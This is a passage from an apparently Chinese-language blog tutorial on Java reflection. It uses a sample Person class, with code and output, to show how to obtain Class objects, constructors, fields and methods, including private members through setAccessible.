<li><p>假设有个Person类</p>
</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了无参构造器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;有参构造器执行了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="0x02-获取Class类的方法"><a href="#0x02-获取Class类的方法" class="headerlink" title="0x02 获取Class类的方法"></a>0x02 获取Class类的方法</h1><ul>
<li>加载类，获取类的字节码，其实就是操作类的Class对象。</li>
</ul>
<h2 id="获取Class的方法"><a href="#获取Class的方法" class="headerlink" title="获取Class的方法"></a>获取Class的方法</h2><h3 id="类名-class"><a href="#类名-class" class="headerlink" title="类名.class"></a>类名.class</h3><ul>
<li>已经加载的类，可以直接调用其class属性</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;Person&gt; personClass1 = Person.class;</span><br></pre></td></tr></table></figure></div>

<h3 id="Class-forName-“类名完整路径”"><a href="#Class-forName-“类名完整路径”" class="headerlink" title="Class.forName(“类名完整路径”)"></a>Class.forName(“类名完整路径”)</h3><ul>
<li>调用Class提供的方法</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; pensonClass2 = Class.forName(<span class="string">&quot;org.example.Person&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h3 id="对象-getClass"><a href="#对象-getClass" class="headerlink" title="对象.getClass()"></a>对象.getClass()</h3><ul>
<li>Object提供的方法</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">Person</span>&gt; personClass3 = person.getClass();</span><br></pre></td></tr></table></figure></div>

<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取Class对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflection01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//直接通用该类的Clas方法获取</span></span><br><span class="line">        Class&lt;Person&gt; personClass1 = Person.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;personClass1 ---&gt; &quot;</span> + personClass1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过Class.forName(“全类名”)获取</span></span><br><span class="line">        Class&lt;?&gt; pensonClass2 = Class.forName(<span class="string">&quot;org.example.Person&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;pensonClass2 ---&gt; &quot;</span> + pensonClass2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过该类的实例化对象获取</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">Person</span>&gt; personClass3 = person.getClass();</span><br><span class="line">        System.out.println(<span class="string">&quot;personClass3 ---&gt; &quot;</span> + personClass3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>输出结果：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">personClass1 ---&gt; <span class="keyword">class</span> <span class="title class_">org</span>.example.Person</span><br><span class="line">pensonClass2 ---&gt; <span class="keyword">class</span> <span class="title class_">org</span>.example.Person</span><br><span class="line">personClass3 ---&gt; <span class="keyword">class</span> <span class="title class_">org</span>.example.Person</span><br></pre></td></tr></table></figure></div>

<h1 id="0x03-获取类的构造器"><a href="#0x03-获取类的构造器" class="headerlink" title="0x03 获取类的构造器"></a>0x03 获取类的构造器</h1><h2 id="获取某个构造器"><a href="#获取某个构造器" class="headerlink" title="获取某个构造器"></a>获取某个构造器</h2><h3 id="getConstructor"><a href="#getConstructor" class="headerlink" title="getConstructor()"></a>getConstructor()</h3><ul>
<li>只能获取public修饰的构造器</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;Person&gt; constructor1 = personClass.getConstructor();</span><br></pre></td></tr></table></figure></div>

<h3 id="getDeclaredConstructor"><a href="#getDeclaredConstructor" class="headerlink" title="getDeclaredConstructor()"></a>getDeclaredConstructor()</h3><ul>
<li><p>只要存在的构造器就能拿到</p>
</li>
<li><p>setAccessible设置为true即表示禁止检查访问控制。</p>
</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;Person&gt; declaredConstructor = personClass.getDeclaredConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div>

<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取类的构造器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflection02</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testReflection02</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//先获取这个类的Class对象</span></span><br><span class="line">        Class&lt;Person&gt; personClass = Person.class;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取某个构造器</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------getConstructor-------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Constructor&lt;Person&gt; constructor = personClass.getConstructor();</span><br><span class="line">        System.out.println(constructor + <span class="string">&quot;---&gt;&quot;</span> + constructor.getParameterCount());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取private构造器</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------getDeclaredConstructor-----------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Constructor&lt;Person&gt; declaredConstructor = personClass.getDeclaredConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(declaredConstructor + <span class="string">&quot;---&gt;&quot;</span> + declaredConstructor.getParameterCount());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>输出结果</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">----------------------getConstructor-------------------------------------------</span><br><span class="line"><span class="keyword">public</span> org.example.Person()---&gt;<span class="number">0</span></span><br><span class="line">----------------------getDeclaredConstructor-----------------------------------</span><br><span class="line"><span class="keyword">private</span> org.example.Person(java.lang.String,<span class="type">int</span>)---&gt;<span class="number">2</span></span><br></pre></td></tr></table></figure></div>

<h2 id="获取全部构造器"><a href="#获取全部构造器" class="headerlink" title="获取全部构造器"></a>获取全部构造器</h2><h3 id="getConstructors"><a href="#getConstructors" class="headerlink" title="getConstructors()"></a>getConstructors()</h3><ul>
<li>只能获取public修饰的构造器</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt;[] constructors = personClass.getConstructors();</span><br></pre></td></tr></table></figure></div>

<h3 id="getDeclaredConstructors"><a href="#getDeclaredConstructors" class="headerlink" title="getDeclaredConstructors()"></a>getDeclaredConstructors()</h3><ul>
<li>只要存在就能拿到</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt;[] declaredConstructors = personClass.getDeclaredConstructors();</span><br></pre></td></tr></table></figure></div>

<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取类的构造器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflection02</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testReflection02</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//先获取这个类的Class对象</span></span><br><span class="line">        Class&lt;Person&gt; personClass = Person.class;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//获取全部public构造器</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------getConstructors------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt;[] constructors = personClass.getConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor&lt;?&gt; constructor1 : constructors) &#123;</span><br><span class="line">            System.out.println(constructor1 + <span class="string">&quot;---&gt;&quot;</span> + constructor1.getParameterCount());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取全部构造器</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------getDeclaredConstructors----------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt;[] declaredConstructors = personClass.getDeclaredConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor&lt;?&gt; declaredConstructor1 : declaredConstructors) &#123;</span><br><span class="line">            System.out.println(declaredConstructor1 + <span class="string">&quot;---&gt;&quot;</span> + declaredConstructor1.getParameterCount());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<ul>
<li>输出结果</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">----------------------getConstructors------------------------------------------</span><br><span class="line"><span class="keyword">public</span> org.example.Person()---&gt;<span class="number">0</span></span><br><span class="line">----------------------getDeclaredConstructors----------------------------------</span><br><span class="line"><span class="keyword">public</span> org.example.Person()---&gt;<span class="number">0</span></span><br><span class="line"><span class="keyword">private</span> org.example.Person(java.lang.String,<span class="type">int</span>)---&gt;<span class="number">2</span></span><br></pre></td></tr></table></figure></div>

<h2 id="初始化对象"><a href="#初始化对象" class="headerlink" title="初始化对象"></a>初始化对象</h2><h3 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance()"></a>newInstance()</h3><ul>
<li><strong>class.newInstance()</strong> 只能反射无参构造器，且构造器是可见的</li>
<li><strong>constructor.newInstance()</strong> 没有限制</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 实例化构造器对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflection03</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testReflection</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//先获取这个类的Class对象</span></span><br><span class="line">        Class&lt;Person&gt; personClass = Person.class;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取某个构造器</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------getConstructor-------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Constructor&lt;Person&gt; constructor1 = personClass.getConstructor();</span><br><span class="line">        System.out.println(constructor1 + <span class="string">&quot;---&gt;&quot;</span> + constructor1.getParameterCount());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> constructor1.newInstance();</span><br><span class="line">        System.out.println(person);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取private构造器</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------getDeclaredConstructor-----------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Constructor&lt;Person&gt; declaredConstructor = personClass.getDeclaredConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(declaredConstructor + <span class="string">&quot;---&gt;&quot;</span> + declaredConstructor.getParameterCount());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> declaredConstructor.newInstance(<span class="string">&quot;小明&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        System.out.println(person1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>输出结果</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">----------------------getConstructor-------------------------------------------</span><br><span class="line"><span class="keyword">public</span> org.example.Person()---&gt;<span class="number">0</span></span><br><span class="line">调用了无参构造器</span><br><span class="line">Person&#123;name=<span class="string">&#x27;null&#x27;</span>, age=<span class="number">0</span>&#125;</span><br><span class="line">----------------------getDeclaredConstructor-----------------------------------</span><br><span class="line"><span class="keyword">private</span> org.example.Person(java.lang.String,<span class="type">int</span>)---&gt;<span class="number">2</span></span><br><span class="line">有参构造器执行了</span><br><span class="line">Person&#123;name=<span class="string">&#x27;小明&#x27;</span>, age=<span class="number">12</span>&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="0x04-获取成员变量"><a href="#0x04-获取成员变量" class="headerlink" title="0x04 获取成员变量"></a>0x04 获取成员变量</h1><h2 id="获取某个成员变量"><a href="#获取某个成员变量" class="headerlink" title="获取某个成员变量"></a>获取某个成员变量</h2><h3 id="getField"><a href="#getField" class="headerlink" title="getField()"></a>getField()</h3><ul>
<li>只能获取public修饰的</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> personClass.getField(<span class="string">&quot;name&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h3 id="getDeclaredField"><a href="#getDeclaredField" class="headerlink" title="getDeclaredField()"></a>getDeclaredField()</h3><ul>
<li>只要存在就能获取</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> personClass.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">declaredField.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div>

<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取Class对象的成员变量</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflection04</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testReflection</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//获取类的Class对象</span></span><br><span class="line">        Class&lt;Person&gt; personClass = Person.class;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取类的某个成员变量</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------getField-------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> personClass.getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(field);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取private的成员变量</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------getDeclaredField-------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> personClass.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(declaredField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<ul>
<li>输出结果</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">----------------------getField-------------------------------------------</span><br><span class="line"><span class="keyword">public</span> java.lang.String org.example.Person.name</span><br><span class="line">----------------------getDeclaredField-------------------------------------------</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> org.example.Person.age</span><br></pre></td></tr></table></figure></div>

<h2 id="获取全部成员变量"><a href="#获取全部成员变量" class="headerlink" title="获取全部成员变量"></a>获取全部成员变量</h2><h3 id="getFields"><a href="#getFields" class="headerlink" title="getFields()"></a>getFields()</h3><ul>
<li>只能获取public修饰的</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Field[] fields = personClass.getFields();</span><br></pre></td></tr></table></figure></div>

<h3 id="getDeclaredFields"><a href="#getDeclaredFields" class="headerlink" title="getDeclaredFields()"></a>getDeclaredFields()</h3><ul>
<li>只要存在就能获取</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Field[] declaredFields = personClass.getDeclaredFields();</span><br></pre></td></tr></table></figure></div>

<h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取Class对象的成员变量</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflection04</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testReflection</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//获取类的Class对象</span></span><br><span class="line">        Class&lt;Person&gt; personClass = Person.class;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取全部public修饰的成员变量</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------getFields-------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field[] fields = personClass.getFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field1 : fields) &#123;</span><br><span class="line">            System.out.println(field1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取全部的成员变量</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------getDeclaredFields-------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field[] declaredFields = personClass.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field declaredField1 : declaredFields) &#123;</span><br><span class="line">            System.out.println(declaredField1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>输出</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">----------------------getFields-------------------------------------------</span><br><span class="line"><span class="keyword">public</span> java.lang.String org.example.Person.name</span><br><span class="line">----------------------getDeclaredFields-------------------------------------------</span><br><span class="line"><span class="keyword">public</span> java.lang.String org.example.Person.name</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> org.example.Person.age</span><br></pre></td></tr></table></figure></div>

<h2 id="赋值和取值"><a href="#赋值和取值" class="headerlink" title="赋值和取值"></a>赋值和取值</h2><ul>
<li>set(Object obj, Object value)</li>
<li>get(Object obj)</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 赋值和取值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflection05</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testReflection</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//获取类的Class对象</span></span><br><span class="line">        Class&lt;Person&gt; personClass = Person.class;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取类的某个成员变量</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> personClass.getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="comment">//        System.out.println(field);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取private的成员变量</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">age</span> <span class="operator">=</span> personClass.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        age.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//        System.out.println(declaredField);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//赋值</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        name.set(person,<span class="string">&quot;小明&quot;</span>);</span><br><span class="line"></span><br><span class="line">        age.set(person,<span class="number">12</span>);</span><br><span class="line">        age.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//取值</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">name1</span> <span class="operator">=</span> name.get(person);</span><br><span class="line">        System.out.println(name1);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">age1</span> <span class="operator">=</span> age.get(person);</span><br><span class="line">        System.out.println(age1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>输出结果</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">调用了无参构造器</span><br><span class="line">Person&#123;name=<span class="string">&#x27;小明&#x27;</span>, age=<span class="number">12</span>&#125;</span><br><span class="line">小明</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure></div>

<h1 id="0x05-获取成员方法"><a href="#0x05-获取成员方法" class="headerlink" title="0x05 获取成员方法"></a>0x05 获取成员方法</h1><ul>
<li>在Person类中添加</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;喜欢跑步&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">eat</span><span class="params">(String foodname)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;喜欢吃&quot;</span> + foodname ;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="获取某个方法"><a href="#获取某个方法" class="headerlink" title="获取某个方法"></a>获取某个方法</h2><h3 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod()"></a>getMethod()</h3><ul>
<li>只能获取public修饰恶毒成员方法</li>
</ul>
<h3 id="getDeclaredMethod"><a href="#getDeclaredMethod" class="headerlink" title="getDeclaredMethod()"></a>getDeclaredMethod()</h3><ul>
<li>只要存在就能拿到</li>
</ul>
<h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取成员方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflection06</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testReflction</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//获取Class对象</span></span><br><span class="line">        Class&lt;Person&gt; personClass = Person.class;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取某个public成员方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------getMethod---------------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">eat</span> <span class="operator">=</span> personClass.getMethod(<span class="string">&quot;eat&quot;</span>,String.class);</span><br><span class="line">        System.out.println(eat);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取private成员方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------getDeclaredMethod-------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">run</span> <span class="operator">=</span> personClass.getDeclaredMethod(<span class="string">&quot;run&quot;</span>);</span><br><span class="line">        System.out.println(run);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>输出结果</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">----------------------getMethod---------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> java.lang.String org.example.Person.eat(java.lang.String)</span><br><span class="line">----------------------getDeclaredMethod-------------------------------------------</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> org.example.Person.run()</span><br></pre></td></tr></table></figure></div>

<h2 id="获取全部方法"><a href="#获取全部方法" class="headerlink" title="获取全部方法"></a>获取全部方法</h2><h3 id="getMethods"><a href="#getMethods" class="headerlink" title="getMethods()"></a>getMethods()</h3><ul>
<li>只能获取public修饰的成员方法</li>
</ul>
<h3 id="getDeclaredMethods"><a href="#getDeclaredMethods" class="headerlink" title="getDeclaredMethods()"></a>getDeclaredMethods()</h3><ul>
<li>只要存在都能拿到</li>
</ul>
